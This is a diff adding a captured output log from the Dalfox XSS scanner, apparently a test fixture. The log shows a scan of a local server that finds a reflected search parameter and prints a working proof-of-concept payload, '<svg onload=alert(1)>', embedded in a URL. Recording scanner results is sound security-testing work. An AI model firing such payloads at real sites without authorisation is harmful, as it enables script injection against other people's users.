@@ -1,0 +1,13 @@
+ ░█████▓          ░████▒       ░         Dalfox v3.2.2
+ ████                  ▓██      Powerful open-source XSS scanner
+ ███▓        ▓███████▓▒▓█░     and utility focused on automation.
+2:13AM INF start scan to http://127.0.0.1:8099/search?q=test
+2:13AM INF found reflected 1 params
+  └── q valid_specials="/\'{`<>"();=|}[.:]+,$-" invalid_specials=""
+2:13AM WRN XSS found 1 XSS
+[POC][V][GET][inHTML] http://127.0.0.1:8099/search?q=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlxcd2a5d69%3E
+  ├── Issue: XSS payload DOM object identified
+  ├── Payload: <svg onload=alert(1) class=dlxcd2a5d69>
+  └── L1: h1><p>You searched: <svg onload=alert(1) class=dlxcd2a5d69></p></body></html>
+2:13AM INF scan completed in 4.893 seconds
+
